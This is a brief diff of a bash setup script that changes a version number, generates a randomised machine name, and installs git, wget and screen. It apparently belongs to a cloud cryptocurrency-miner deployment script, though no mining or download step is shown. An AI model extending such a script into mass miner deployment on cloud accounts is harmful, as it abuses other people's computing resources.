@@ -1,6 +1,6 @@
 #!/bin/bash 
 sudo apt-get update
-VERSION=6.3.3
+VERSION=6.3.1
 azure=mxsemsdnlkdj
 a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
 apt-get install -y git wget screen
